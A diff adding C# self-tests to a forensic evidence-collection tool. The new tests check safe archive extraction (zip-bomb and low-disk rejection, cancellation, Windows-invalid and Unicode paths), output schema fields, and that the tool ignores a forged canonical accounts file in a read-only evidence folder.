@@ -2,15 +2,18 @@
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Globalization;
 using System.IO;
 using System.IO.Compression;
 using System.Linq;
 using System.Reflection;
 using System.Text;
+using System.Threading;
 using System.Windows.Forms;
 using IR_Collect.Analysis;
 using IR_Collect.Analysis.Correlation;
 using IR_Collect.Analysis.Correlation.Normalizers;
+using IR_Collect.Collectors;
 using IR_Collect.Utils;
 
 namespace IR_Collect.Tests
@@ -26,6 +29,12 @@ namespace IR_Collect.Tests
             failed += RunOne("IsPathUnderRoot_rejects_prefix_sibling", IsPathUnderRoot_rejects_prefix_sibling, sb) ? 0 : 1;
             failed += RunOne("ExtractZip_rejects_traversal_only", ExtractZip_rejects_traversal_only, sb) ? 0 : 1;
             failed += RunOne("ExtractZip_accepts_plain_entry", ExtractZip_accepts_plain_entry, sb) ? 0 : 1;
+            failed += RunOne("ArchiveIntake_zip_maps_windows_invalid_name", ArchiveIntake_zip_maps_windows_invalid_name, sb) ? 0 : 1;
+            failed += RunOne("ArchiveIntake_tar_pax_preserves_unicode_path", ArchiveIntake_tar_pax_preserves_unicode_path, sb) ? 0 : 1;
+            failed += RunOne("ArchiveIntake_rejects_zip_expansion_bomb_without_partial_output", ArchiveIntake_rejects_zip_expansion_bomb_without_partial_output, sb) ? 0 : 1;
+            failed += RunOne("ArchiveIntake_rejects_targz_expansion_bomb_without_partial_output", ArchiveIntake_rejects_targz_expansion_bomb_without_partial_output, sb) ? 0 : 1;
+            failed += RunOne("ArchiveIntake_rejects_low_disk_without_partial_output", ArchiveIntake_rejects_low_disk_without_partial_output, sb) ? 0 : 1;
+            failed += RunOne("ArchiveIntake_cancellation_leaves_no_partial_output", ArchiveIntake_cancellation_leaves_no_partial_output, sb) ? 0 : 1;
             failed += RunOne("EventLogLabel_strips_suffix_case_insensitive", EventLogLabel_strips_suffix_case_insensitive, sb) ? 0 : 1;
             failed += RunOne("EventLogLabel_keeps_non_suffix_name", EventLogLabel_keeps_non_suffix_name, sb) ? 0 : 1;
             failed += RunOne("CaseManager_GetRelativePath_accepts_child", CaseManager_GetRelativePath_accepts_child, sb) ? 0 : 1;
@@ -42,6 +51,7 @@ namespace IR_Collect.Tests
             failed += RunOne("SqliteModule_unsigned_or_missing_dll_is_rejected", SqliteModule_unsigned_or_missing_dll_is_rejected, sb) ? 0 : 1;
             failed += RunOne("ConfigAcl_hardening_keeps_file_readable_and_no_throw", ConfigAcl_hardening_keeps_file_readable_and_no_throw, sb) ? 0 : 1;
             failed += RunOne("CsvExport_neutralizes_formula_injection", CsvExport_neutralizes_formula_injection, sb) ? 0 : 1;
+            failed += RunOne("AtomicFile_failure_preserves_published_output_and_cleans_staging", AtomicFile_failure_preserves_published_output_and_cleans_staging, sb) ? 0 : 1;
             failed += RunOne("RunToFile_streams_output_and_cleans_on_failure", RunToFile_streams_output_and_cleans_on_failure, sb) ? 0 : 1;
             failed += RunOne("MemoryRecord_args_governance_note_round_trips", MemoryRecord_args_governance_note_round_trips, sb) ? 0 : 1;
             failed += RunOne("Lnk_parser_reads_unicode_and_ansi_local_base_path", Lnk_parser_reads_unicode_and_ansi_local_base_path, sb) ? 0 : 1;
@@ -51,7 +61,30 @@ namespace IR_Collect.Tests
             failed += RunOne("MftParser_prefers_win32_long_name_over_dos_short_name", MftParser_prefers_win32_long_name_over_dos_short_name, sb) ? 0 : 1;
             failed += RunOne("ShimCache_structured_win10_entry_recovers_path_and_filetime", ShimCache_structured_win10_entry_recovers_path_and_filetime, sb) ? 0 : 1;
             failed += RunOne("AnalyzeFolder_ingests_artifacts_and_builds_summary", AnalyzeFolder_ingests_artifacts_and_builds_summary, sb) ? 0 : 1;
+            failed += RunOne("AnalyzeFolder_readonly_workspace_rejects_forged_canonical_and_stabilizes_digest", AnalyzeFolder_readonly_workspace_rejects_forged_canonical_and_stabilizes_digest, sb) ? 0 : 1;
+            failed += RunOne("AnalyzeFolder_uac_process_snapshot_derives_canonical_process_csv", AnalyzeFolder_uac_process_snapshot_derives_canonical_process_csv, sb) ? 0 : 1;
+            failed += RunOne("AnalyzeFolder_uac_bodyfile_derives_activity_timeline", AnalyzeFolder_uac_bodyfile_derives_activity_timeline, sb) ? 0 : 1;
+            failed += RunOne("AnalyzeFolder_uac_auth_log_derives_structured_auth_facts", AnalyzeFolder_uac_auth_log_derives_structured_auth_facts, sb) ? 0 : 1;
+            failed += RunOne("AnalyzeFolder_uac_network_snapshot_derives_network_connection_facts", AnalyzeFolder_uac_network_snapshot_derives_network_connection_facts, sb) ? 0 : 1;
+            failed += RunOne("AnalyzeFolder_uac_persistence_derives_linux_macos_facts", AnalyzeFolder_uac_persistence_derives_linux_macos_facts, sb) ? 0 : 1;
+            failed += RunOne("AnalyzeFolder_uac_journal_derives_header_and_boot_facts", AnalyzeFolder_uac_journal_derives_header_and_boot_facts, sb) ? 0 : 1;
+            failed += RunOne("AnalyzeFolder_uac_login_outputs_derive_facts_without_inventing_utc", AnalyzeFolder_uac_login_outputs_derive_facts_without_inventing_utc, sb) ? 0 : 1;
+            failed += RunOne("AnalyzeFolder_uac_auditd_groups_compound_events_and_decodes_commands", AnalyzeFolder_uac_auditd_groups_compound_events_and_decodes_commands, sb) ? 0 : 1;
+            failed += RunOne("AnalyzeFolder_uac_system_logs_parse_rfc_formats_without_inventing_time", AnalyzeFolder_uac_system_logs_parse_rfc_formats_without_inventing_time, sb) ? 0 : 1;
+            failed += RunOne("AnalyzeFolder_uac_packages_normalize_inventory_and_time_semantics", AnalyzeFolder_uac_packages_normalize_inventory_and_time_semantics, sb) ? 0 : 1;
+            failed += RunOne("AnalyzeFolder_uac_file_hashes_normalize_multi_platform_formats", AnalyzeFolder_uac_file_hashes_normalize_multi_platform_formats, sb) ? 0 : 1;
+            failed += RunOne("AnalyzeFolder_uac_web_logs_parse_access_error_gzip_and_time_semantics", AnalyzeFolder_uac_web_logs_parse_access_error_gzip_and_time_semantics, sb) ? 0 : 1;
+            failed += RunOne("AnalyzeArchive_uac_tar_gz_ingests_complete_evidence", AnalyzeArchive_uac_tar_gz_ingests_complete_evidence, sb) ? 0 : 1;
+            failed += RunOne("ArchiveIntake_rejects_tar_path_traversal", ArchiveIntake_rejects_tar_path_traversal, sb) ? 0 : 1;
             failed += RunOne("RawArtifactCsvWriter_amcache_output_is_consumable_by_normalizer", RawArtifactCsvWriter_amcache_output_is_consumable_by_normalizer, sb) ? 0 : 1;
+            failed += RunOne("DiffBuilder_detects_added_modified_and_reverse_removed_facts", DiffBuilder_detects_added_modified_and_reverse_removed_facts, sb) ? 0 : 1;
+            failed += RunOne("DiffTab_builds_grid_from_loaded_ready_baseline", DiffTab_builds_grid_from_loaded_ready_baseline, sb) ? 0 : 1;
+            failed += RunOne("DiffCli_compares_readonly_folders_and_writes_diff_v1", DiffCli_compares_readonly_folders_and_writes_diff_v1, sb) ? 0 : 1;
+            failed += RunOne("FactStoreBuildCache_reuses_unchanged_case", FactStoreBuildCache_reuses_unchanged_case, sb) ? 0 : 1;
+            failed += RunOne("FactStoreBuildCache_rebuilds_only_changed_eventlog", FactStoreBuildCache_rebuilds_only_changed_eventlog, sb) ? 0 : 1;
+            failed += RunOne("FactStoreBuildCache_non_event_change_falls_back_full", FactStoreBuildCache_non_event_change_falls_back_full, sb) ? 0 : 1;
+            failed += RunOne("FactStoreBuildCache_corrupt_cache_falls_back_full", FactStoreBuildCache_corrupt_cache_falls_back_full, sb) ? 0 : 1;
+            failed += RunOne("FactStoreAutoBuild_rebuilds_stale_store", FactStoreAutoBuild_rebuilds_stale_store, sb) ? 0 : 1;
             failed += RunOne("CorrelateCli_finds_shared_entity_across_two_folders", CorrelateCli_finds_shared_entity_across_two_folders, sb) ? 0 : 1;
             failed += RunOne("BuildInfo_version_matches_assembly_and_is_stamped_in_outputs", BuildInfo_version_matches_assembly_and_is_stamped_in_outputs, sb) ? 0 : 1;
             failed += RunOne("EvidenceManifest_hashes_inputs_and_summary_carries_digest", EvidenceManifest_hashes_inputs_and_summary_carries_digest, sb) ? 0 : 1;
@@ -97,6 +130,7 @@ namespace IR_Collect.Tests
             failed += RunOne("SummaryExport_serialize_handles_minvalue_fact_time", SummaryExport_serialize_handles_minvalue_fact_time, sb) ? 0 : 1;
             failed += RunOne("ParserNoteSummary_includes_non_amcache_sources", ParserNoteSummary_includes_non_amcache_sources, sb) ? 0 : 1;
             failed += RunOne("SummaryTab_includes_parser_notes_section", SummaryTab_includes_parser_notes_section, sb) ? 0 : 1;
+            failed += RunOne("Summary_and_html_include_forensic_policy_metadata", Summary_and_html_include_forensic_policy_metadata, sb) ? 0 : 1;
             failed += RunOne("HtmlReport_missing_artifact_counts_render_not_found", HtmlReport_missing_artifact_counts_render_not_found, sb) ? 0 : 1;
             failed += RunOne("SummaryPayload_missing_artifact_counts_are_zero", SummaryPayload_missing_artifact_counts_are_zero, sb) ? 0 : 1;
             failed += RunOne("ShellBagsParser_DecodeShellItemBlob_ascii_segment", ShellBagsParser_DecodeShellItemBlob_ascii_segment, sb) ? 0 : 1;
@@ -138,6 +172,13 @@ namespace IR_Collect.Tests
             failed += RunOne("CollectionModeProfile_forensic_strict_blocks_outbound_helpers", CollectionModeProfile_forensic_strict_blocks_outbound_helpers, sb) ? 0 : 1;
             failed += RunOne("CollectionModeProfile_standard_allows_outbound_helpers", CollectionModeProfile_standard_allows_outbound_helpers, sb) ? 0 : 1;
             failed += RunOne("CollectionCoverage_report_includes_mode_profile", CollectionCoverage_report_includes_mode_profile, sb) ? 0 : 1;
+            failed += RunOne("CollectionImpactPolicy_classifies_system_network_and_unknown_targets", CollectionImpactPolicy_classifies_system_network_and_unknown_targets, sb) ? 0 : 1;
+            failed += RunOne("CollectionImpactPolicy_strict_restricts_enabled_high_impact_steps", CollectionImpactPolicy_strict_restricts_enabled_high_impact_steps, sb) ? 0 : 1;
+            failed += RunOne("CollectionImpactPolicy_standard_does_not_restrict_steps", CollectionImpactPolicy_standard_does_not_restrict_steps, sb) ? 0 : 1;
+            failed += RunOne("Collector_forensic_strict_without_acknowledgment_is_rejected_before_collection", Collector_forensic_strict_without_acknowledgment_is_rejected_before_collection, sb) ? 0 : 1;
+            failed += RunOne("CollectionCoverage_forensic_policy_metadata_round_trips_and_marks_partial", CollectionCoverage_forensic_policy_metadata_round_trips_and_marks_partial, sb) ? 0 : 1;
+            failed += RunOne("MemoryCollectors_run_policy_writes_skipped_sidecars_without_tools", MemoryCollectors_run_policy_writes_skipped_sidecars_without_tools, sb) ? 0 : 1;
+            failed += RunOne("CollectionResult_profile_skip_sets_coverage_gap", CollectionResult_profile_skip_sets_coverage_gap, sb) ? 0 : 1;
             failed += RunOne("ZipUpload_gate_uses_run_profile_ForensicStrict_even_if_settings_Standard", ZipUpload_gate_uses_run_profile_ForensicStrict_even_if_settings_Standard, sb) ? 0 : 1;
             failed += RunOne("ZipUpload_gate_run_Standard_not_blocked_when_settings_ForensicStrict", ZipUpload_gate_run_Standard_not_blocked_when_settings_ForensicStrict, sb) ? 0 : 1;
             failed += RunOne("ZipUpload_gate_null_run_falls_back_to_settings_ForensicStrict", ZipUpload_gate_null_run_falls_back_to_settings_ForensicStrict, sb) ? 0 : 1;
@@ -150,15 +191,21 @@ namespace IR_Collect.Tests
             failed += RunOne("AiRedaction_basic_masks_memory_collector_user", AiRedaction_basic_masks_memory_collector_user, sb) ? 0 : 1;
             failed += RunOne("AiRedaction_basic_masks_fact_details_unc_paths_live_untouched", AiRedaction_basic_masks_fact_details_unc_paths_live_untouched, sb) ? 0 : 1;
             failed += RunOne("AiRedaction_basic_masks_workflow_notes_paths_live_untouched", AiRedaction_basic_masks_workflow_notes_paths_live_untouched, sb) ? 0 : 1;
+            failed += RunOne("AiRedaction_basic_masks_fact_store_inputs_live_untouched", AiRedaction_basic_masks_fact_store_inputs_live_untouched, sb) ? 0 : 1;
             failed += RunOne("AiRedaction_strict_clears_fact_samples", AiRedaction_strict_clears_fact_samples, sb) ? 0 : 1;
             failed += RunOne("AiRedaction_basic_masks_ipv4_in_highlights", AiRedaction_basic_masks_ipv4_in_highlights, sb) ? 0 : 1;
             failed += RunOne("AiRedaction_none_unchanged_highlight", AiRedaction_none_unchanged_highlight, sb) ? 0 : 1;
             failed += RunOne("FixtureCorpus_committed_files_match_builder_and_parse_as_expected", FixtureCorpus_committed_files_match_builder_and_parse_as_expected, sb) ? 0 : 1;
 
+            int cleanupFailures = CaseManager.CleanupAll();
+            if (cleanupFailures > 0)
+                sb.AppendLine("WARN: " + cleanupFailures.ToString(CultureInfo.InvariantCulture) +
+                    " analysis workspace cleanup operation(s) failed.");
+
             sb.AppendLine();
             sb.AppendLine(failed == 0 ? "SUMMARY: 0 failed (all passed)." : "SUMMARY: " + failed + " failed.");
 
-            string outPath = Path.Combine(Path.GetTempPath(), "IR_Collect_TestResult.txt");
+            string outPath = Path.Combine(Path.GetTempPath(), BuildInfo.SelfTestResultFileName);
             try
             {
                 File.WriteAllText(outPath, sb.ToString(), new UTF8Encoding(false));
@@ -282,6 +329,214 @@ namespace IR_Collect.Tests
             {
                 TryDeleteDir(dir);
             }
+        }
+
+        private static bool ArchiveIntake_zip_maps_windows_invalid_name()
+        {
+            string dir = Path.Combine(Path.GetTempPath(), "IRCollectZipMap_" + Guid.NewGuid().ToString("N"));
+            string zipPath = Path.Combine(dir, "uac.zip");
+            string extractDir = Path.Combine(dir, "out");
+            try
+            {
+                Directory.CreateDirectory(dir);
+                using (var fs = new FileStream(zipPath, FileMode.Create))
+                using (var archive = new ZipArchive(fs, ZipArchiveMode.Create))
+                {
+                    ZipArchiveEntry e = archive.CreateEntry("uac/[root]/tmp/name:stream.txt", CompressionLevel.Fastest);
+                    using (var w = new StreamWriter(e.Open(), new UTF8Encoding(false)))
+                        w.Write("evidence");
+                }
+
+                ArchiveExtractionResult result = ArchiveIntake.ExtractSafely(zipPath, extractDir);
+                ArchiveEntryRecord record = result.Entries.FirstOrDefault(x =>
+                    string.Equals(x.OriginalPath, "uac/[root]/tmp/name:stream.txt", StringComparison.Ordinal));
+                if (record == null || string.Equals(record.OriginalPath, record.ExtractedPath, StringComparison.Ordinal)) return false;
+                if (!string.Equals(record.Status, "renamed-for-windows", StringComparison.Ordinal)) return false;
+                string extracted = Path.Combine(extractDir, record.ExtractedPath.Replace('/', Path.DirectorySeparatorChar));
+                return File.Exists(extracted) &&
+                    File.ReadAllText(extracted).IndexOf("evidence", StringComparison.Ordinal) >= 0 &&
+                    File.Exists(Path.Combine(extractDir, ArtifactNames.UacArchiveEntriesCsv));
+            }
+            finally
+            {
+                TryDeleteDir(dir);
+            }
+        }
+
+        private static bool ArchiveIntake_tar_pax_preserves_unicode_path()
+        {
+            string dir = Path.Combine(Path.GetTempPath(), "IRCollectPax_" + Guid.NewGuid().ToString("N"));
+            string archivePath = Path.Combine(dir, "pax.tar.gz");
+            string extractDir = Path.Combine(dir, "out");
+            const string unicodePath = "uac/[root]/home/analyst/\u8abf\u67e5\u8a18\u9304.txt";
+            try
+            {
+                Directory.CreateDirectory(dir);
+                using (FileStream file = new FileStream(archivePath, FileMode.Create, FileAccess.Write, FileShare.None))
+                using (GZipStream gzip = new GZipStream(file, CompressionMode.Compress))
+                {
+                    WriteTarEntry(gzip, "PaxHeader", BuildPaxRecord("path", unicodePath), 'x');
+                    WriteTarEntry(gzip, "placeholder.txt", Encoding.UTF8.GetBytes("unicode evidence"), '0');
+                    gzip.Write(new byte[1024], 0, 1024);
+                }
+
+                ArchiveExtractionResult result = ArchiveIntake.ExtractSafely(archivePath, extractDir);
+                ArchiveEntryRecord record = result.Entries.FirstOrDefault(x => string.Equals(x.OriginalPath, unicodePath, StringComparison.Ordinal));
+                if (record == null) return false;
+                string extracted = Path.Combine(extractDir, record.ExtractedPath.Replace('/', Path.DirectorySeparatorChar));
+                return File.Exists(extracted) && File.ReadAllText(extracted).IndexOf("unicode evidence", StringComparison.Ordinal) >= 0;
+            }
+            finally
+            {
+                TryDeleteDir(dir);
+            }
+        }
+
+        private static bool ArchiveIntake_rejects_zip_expansion_bomb_without_partial_output()
+        {
+            string dir = Path.Combine(Path.GetTempPath(), "IRCollectZipBomb_" + Guid.NewGuid().ToString("N"));
+            string archivePath = Path.Combine(dir, "bomb.zip");
+            string extractDir = Path.Combine(dir, "out");
+            try
+            {
+                Directory.CreateDirectory(dir);
+                using (var fs = new FileStream(archivePath, FileMode.Create, FileAccess.Write, FileShare.None))
+                using (var archive = new ZipArchive(fs, ZipArchiveMode.Create))
+                {
+                    ZipArchiveEntry entry = archive.CreateEntry("zeros.bin", CompressionLevel.Optimal);
+                    using (Stream output = entry.Open())
+                    {
+                        byte[] zeros = new byte[1024 * 1024];
+                        output.Write(zeros, 0, zeros.Length);
+                    }
+                }
+
+                var options = CreateSmallArchiveSafetyOptions();
+                options.ExpansionRatioMinimumBytes = 1;
+                options.MaxExpansionRatio = 2.0;
+                bool rejected = false;
+                try { ArchiveIntake.ExtractSafely(archivePath, extractDir, options); }
+                catch (InvalidDataException) { rejected = true; }
+                return rejected && HasNoPublishedOrStagingOutput(dir, extractDir);
+            }
+            finally
+            {
+                TryDeleteDir(dir);
+            }
+        }
+
+        private static bool ArchiveIntake_rejects_targz_expansion_bomb_without_partial_output()
+        {
+            string dir = Path.Combine(Path.GetTempPath(), "IRCollectTarBomb_" + Guid.NewGuid().ToString("N"));
+            string archivePath = Path.Combine(dir, "bomb.tar.gz");
+            string extractDir = Path.Combine(dir, "out");
+            try
+            {
+                Directory.CreateDirectory(dir);
+                using (FileStream file = new FileStream(archivePath, FileMode.Create, FileAccess.Write, FileShare.None))
+                using (GZipStream gzip = new GZipStream(file, CompressionMode.Compress))
+                {
+                    WriteTarEntry(gzip, "uac/[root]/tmp/zeros.bin", new byte[1024 * 1024], '0');
+                    gzip.Write(new byte[1024], 0, 1024);
+                }
+
+                var options = CreateSmallArchiveSafetyOptions();
+                options.ExpansionRatioMinimumBytes = 1;
+                options.MaxExpansionRatio = 2.0;
+                bool rejected = false;
+                try { ArchiveIntake.ExtractSafely(archivePath, extractDir, options); }
+                catch (InvalidDataException) { rejected = true; }
+                return rejected && HasNoPublishedOrStagingOutput(dir, extractDir);
+            }
+            finally
+            {
+                TryDeleteDir(dir);
+            }
+        }
+
+        private static bool ArchiveIntake_rejects_low_disk_without_partial_output()
+        {
+            string dir = Path.Combine(Path.GetTempPath(), "IRCollectLowDisk_" + Guid.NewGuid().ToString("N"));
+            string archivePath = Path.Combine(dir, "evidence.zip");
+            string extractDir = Path.Combine(dir, "out");
+            try
+            {
+                Directory.CreateDirectory(dir);
+                using (var fs = new FileStream(archivePath, FileMode.Create, FileAccess.Write, FileShare.None))
+                using (var archive = new ZipArchive(fs, ZipArchiveMode.Create))
+                {
+                    ZipArchiveEntry entry = archive.CreateEntry("evidence.bin", CompressionLevel.NoCompression);
+                    using (Stream output = entry.Open())
+                    {
+                        byte[] bytes = new byte[4096];
+                        for (int i = 0; i < bytes.Length; i++) bytes[i] = (byte)(i % 251);
+                        output.Write(bytes, 0, bytes.Length);
+                    }
+                }
+
+                var options = CreateSmallArchiveSafetyOptions();
+                options.AvailableFreeSpaceBytesOverride = 4096;
+                options.MinimumFreeSpaceBytes = 1024;
+                bool rejected = false;
+                try { ArchiveIntake.ExtractSafely(archivePath, extractDir, options); }
+                catch (IOException) { rejected = true; }
+                return rejected && HasNoPublishedOrStagingOutput(dir, extractDir);
+            }
+            finally
+            {
+                TryDeleteDir(dir);
+            }
+        }
+
+        private static bool ArchiveIntake_cancellation_leaves_no_partial_output()
+        {
+            string dir = Path.Combine(Path.GetTempPath(), "IRCollectCancel_" + Guid.NewGuid().ToString("N"));
+            string archivePath = Path.Combine(dir, "evidence.zip");
+            string extractDir = Path.Combine(dir, "out");
+            try
+            {
+                Directory.CreateDirectory(dir);
+                using (var fs = new FileStream(archivePath, FileMode.Create, FileAccess.Write, FileShare.None))
+                using (var archive = new ZipArchive(fs, ZipArchiveMode.Create))
+                {
+                    ZipArchiveEntry entry = archive.CreateEntry("evidence.txt", CompressionLevel.Fastest);
+                    using (var writer = new StreamWriter(entry.Open(), new UTF8Encoding(false)))
+                        writer.Write("cancelled evidence");
+                }
+
+                var cancellation = new CancellationTokenSource();
+                cancellation.Cancel();
+                bool cancelled = false;
+                try { ArchiveIntake.ExtractSafely(archivePath, extractDir, cancellation.Token); }
+                catch (OperationCanceledException) { cancelled = true; }
+                finally { cancellation.Dispose(); }
+                return cancelled && HasNoPublishedOrStagingOutput(dir, extractDir);
+            }
+            finally
+            {
+                TryDeleteDir(dir);
+            }
+        }
+
+        private static ArchiveIntakeOptions CreateSmallArchiveSafetyOptions()
+        {
+            return new ArchiveIntakeOptions
+            {
+                MaxArchiveEntries = 100,
+                MaxExtractedBytes = 4L * 1024 * 1024,
+                MaxSingleEntryBytes = 2L * 1024 * 1024,
+                ExpansionRatioMinimumBytes = 1024 * 1024,
+                MaxExpansionRatio = 1000.0,
+                MinimumFreeSpaceBytes = 0,
+                AvailableFreeSpaceBytesOverride = 16L * 1024 * 1024
+            };
+        }
+
+        private static bool HasNoPublishedOrStagingOutput(string parent, string destination)
+        {
+            if (Directory.Exists(destination) || File.Exists(destination)) return false;
+            string name = Path.GetFileName(destination);
+            return Directory.GetDirectories(parent, name + ".partial-*", SearchOption.TopDirectoryOnly).Length == 0;
         }
 
         private static bool Cli_unknown_arg_exits_nonzero()
@@ -596,7 +851,7 @@ namespace IR_Collect.Tests
             }
         }
 
-        // Drift guard: the generated correlation_v1 / graph_v1 JSON must contain every field the published
+        // Drift guard: generated correlation_v1 / graph_v1 / diff_v1 JSON must contain every field the published
         // JSON Schema files (docs/schemas/) mark as required, so the documented contract can't silently
         // diverge from the code.
         private static bool OutputSchemas_required_fields_present_in_generated_json()
@@ -615,7 +870,50 @@ namespace IR_Collect.Tests
                 string[] graphReq = { "export_schema", "generated_at", "tool_name", "tool_version", "seed_type", "seed_value", "max_depth", "host_count", "node_count", "edge_count", "nodes", "edges" };
                 foreach (string field in graphReq)
                     if (gj.IndexOf("\"" + field + "\"", StringComparison.Ordinal) < 0) return false;
-                return gj.IndexOf("\"graph_v1\"", StringComparison.Ordinal) >= 0;
+                if (gj.IndexOf("\"graph_v1\"", StringComparison.Ordinal) < 0) return false;
+
+                CaseData baseline = CreateDiffCase("schema-baseline");
+                CaseData target = CreateDiffCase("schema-target");
+                string dj = DiffExport.Serialize(DiffBuilder.Build(baseline, target));
+                string[] diffReq = { "diff_schema", "generated_at", "tool_name", "tool_version", "analysis_mode", "baseline_ref", "target_ref", "change_count", "changes_truncated", "max_changes", "changes" };
+                foreach (string field in diffReq)
+                    if (dj.IndexOf("\"" + field + "\"", StringComparison.Ordinal) < 0) return false;
+                if (dj.IndexOf("\"diff_v1\"", StringComparison.Ordinal) < 0) return false;
+
+                string sj = SummaryExport.Serialize(new SummaryPayload
+                {
+                    ExportSchema = "summary_v3",
+                    FactStoreBuildMode = "Incremental",
+                    FactStoreBuildGeneratedAt = DateTime.UtcNow.ToString("o"),
+                    FactStoreBuildDetail = "test",
+                    CollectionCoverage = new CollectionCoverageReport
+                    {
+                        CollectionModeProfile = CollectionModeProfileHelper.ForensicStrict,
+                        OperatorAcknowledgedRisks = true,
+                        OutputTargetClass = CollectionImpactPolicy.OutputSystemDisk,
+                        RestrictedSteps = new List<string> { CollectionImpactPolicy.DeepScanStep },
+                        SkippedByProfile = new List<string> { CollectionImpactPolicy.MemoryAcquisitionStep }
+                    },
+                    FactStoreBuildInputs = new List<FactStoreInputFingerprint>
+                    {
+                        new FactStoreInputFingerprint
+                        {
+                            RelativePath = "evidence/Process.csv",
+                            Size = 1,
+                            MtimeUtc = DateTime.UtcNow.ToString("o"),
+                            Sha256 = new string('a', 64),
+                            NormalizerName = "Process"
+                        }
+                    }
+                });
+                string[] summaryBuildFields = {
+                    "fact_store_build_mode", "fact_store_build_generated_at", "fact_store_build_detail",
+                    "fact_store_build_inputs", "relative_path", "normalizer_name",
+                    "operator_acknowledged_risks", "restricted_steps", "skipped_by_profile", "output_target_class"
+                };
+                foreach (string field in summaryBuildFields)
+                    if (sj.IndexOf("\"" + field + "\"", StringComparison.Ordinal) < 0) return false;
+                return true;
             }
             catch
             {
@@ -948,7 +1246,7 @@ namespace IR_Collect.Tests
             string expected = asm.Major + "." + asm.Minor + "." + asm.Build;
             if (!string.Equals(IR_Collect.BuildInfo.Version, expected, StringComparison.Ordinal)) return false;
             if (string.IsNullOrEmpty(IR_Collect.BuildInfo.Version) || IR_Collect.BuildInfo.Version == "0.0.0") return false;
-            if (!string.Equals(IR_Collect.BuildInfo.ToolName, "IR_Collect", StringComparison.Ordinal)) return false;
+            if (!string.Equals(IR_Collect.BuildInfo.ToolName, "9SEC Evidence Workbench", StringComparison.Ordinal)) return false;
 
             string stamp = "\"tool_version\":\"" + expected + "\"";
 
@@ -958,7 +1256,7 @@ namespace IR_Collect.Tests
             var g = IR_Collect.Analysis.GraphCli.BuildGraph(new IR_Collect.Analysis.CaseData[0], "Path", "x", 1, null);
             string gj = IR_Collect.Analysis.GraphCli.Serialize(g);
             return gj.IndexOf(stamp, StringComparison.Ordinal) >= 0
-                && gj.IndexOf("\"tool_name\":\"IR_Collect\"", StringComparison.Ordinal) >= 0;
+                && gj.IndexOf("\"tool_name\":\"9SEC Evidence Workbench\"", StringComparison.Ordinal) >= 0;
         }
 
         // Phase 3.2b: two Amcache file rows share a Publisher but have different paths. Seeding the graph
@@ -1104,6 +1402,1664 @@ namespace IR_Collect.Tests
             finally
             {
                 try { if (Directory.Exists(dir)) Directory.Delete(dir, true); } catch { }
+            }
+        }
+
+        private static bool AnalyzeFolder_readonly_workspace_rejects_forged_canonical_and_stabilizes_digest()
+        {
+            string dir = Path.Combine(Path.GetTempPath(), "ircol_readonly_" + Guid.NewGuid().ToString("N"));
+            CaseData first = null;
+            CaseData second = null;
+            try
+            {
+                string etc = Path.Combine(dir, "[root]", "etc");
+                Directory.CreateDirectory(etc);
+                File.WriteAllText(Path.Combine(dir, "uac.log"),
+                    "2026-07-28 12:00:00 +0000 INF Unix-like Artifacts Collector\r\n" +
+                    "2026-07-28 12:00:00 +0000 INF Hostname: UAC-READONLY-01\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(etc, "passwd"),
+                    "real-user:x:1001:1001:Real User:/home/real-user:/bin/bash\r\n",
+                    new UTF8Encoding(false));
+
+                string forgedPath = Path.Combine(dir, ArtifactNames.UacAccountsCsv);
+                string forgedContent =
+                    "RecordType,Name,Id,PrimaryGroupId,Home,Shell,Members,PasswordState,Description,SourcePath\r\n" +
+                    "User,forged-user,0,0,/root,/bin/sh,,set,forged,forged.csv\r\n";
+                File.WriteAllText(forgedPath, forgedContent, new UTF8Encoding(false));
+
+                EvidenceManifestResult before = EvidenceManifest.HashFolder(dir);
+                first = CaseManager.LoadCaseFromFolder(dir);
+                EvidenceManifestResult afterFirst = EvidenceManifest.HashFolder(dir);
+                if (first == null || !string.Equals(before.Digest, afterFirst.Digest, StringComparison.Ordinal))
+                    return false;
+                if (first.LoadWarnings == null || !first.LoadWarnings.Any(x =>
+                    x.IndexOf("not trusted", StringComparison.OrdinalIgnoreCase) >= 0))
+                    return false;
+                if (!string.Equals(File.ReadAllText(forgedPath), forgedContent, StringComparison.Ordinal))
+                    return false;
+                if (string.IsNullOrEmpty(first.AnalysisPath) ||
+                    CaseManager.IsPathUnderRoot(first.AnalysisPath, dir))
+                    return false;
+
+                string accountsPath = CaseManager.ResolveArtifactPath(first, ArtifactNames.UacAccountsCsv);
+                if (string.IsNullOrEmpty(accountsPath) || !File.Exists(accountsPath) ||
+                    !CaseManager.IsPathUnderRoot(accountsPath, first.AnalysisPath))
+                    return false;
+                string canonical = File.ReadAllText(accountsPath);
+                if (canonical.IndexOf("real-user", StringComparison.Ordinal) < 0 ||
+                    canonical.IndexOf("forged-user", StringComparison.Ordinal) >= 0)
+                    return false;
+
+                FactStore store = FactStore.BuildFromCase(first);
+                bool hasReal = store.Facts.Any(f =>
+                    string.Equals(f.Source, UacAccountNormalizer.SourceName, StringComparison.Ordinal) &&
+                    HasEntity(f, "User", "real-user"));
+                bool hasForged = store.Facts.Any(f =>
+                    string.Equals(f.Source, UacAccountNormalizer.SourceName, StringComparison.Ordinal) &&
+                    HasEntity(f, "User", "forged-user"));
+                if (!hasReal || hasForged)
+                    return false;
+
+                string workspaceManifest = CaseManager.ResolveArtifactPath(first,
+                    ArtifactNames.AnalysisWorkspaceManifestJson);
+                if (string.IsNullOrEmpty(workspaceManifest) || !File.Exists(workspaceManifest))
+                    return false;
+                string manifestJson = File.ReadAllText(workspaceManifest);
+                if (manifestJson.IndexOf("\"source_read_only\":true", StringComparison.OrdinalIgnoreCase) < 0 ||
+                    manifestJson.IndexOf(ArtifactNames.UacAccountsCsv, StringComparison.OrdinalIgnoreCase) < 0 ||
+                    manifestJson.IndexOf(EvidenceManifest.ComputeSha256(accountsPath),
+                        StringComparison.OrdinalIgnoreCase) < 0)
+                    return false;
+
+                second = CaseManager.LoadCaseFromFolder(dir);
+                EvidenceManifestResult afterSecond = EvidenceManifest.HashFolder(dir);
+                return second != null &&
+                    string.Equals(first.EvidenceDigest, second.EvidenceDigest, StringComparison.Ordinal) &&
+                    string.Equals(before.Digest, afterSecond.Digest, StringComparison.Ordinal);
+            }
+            finally
+            {
+                if (first != null) CaseManager.RemoveCase(first);
+                if (second != null) CaseManager.RemoveCase(second);
+                TryDeleteDir(dir);
+            }
+        }
+
+        private static bool AnalyzeFolder_uac_process_snapshot_derives_canonical_process_csv()
+        {
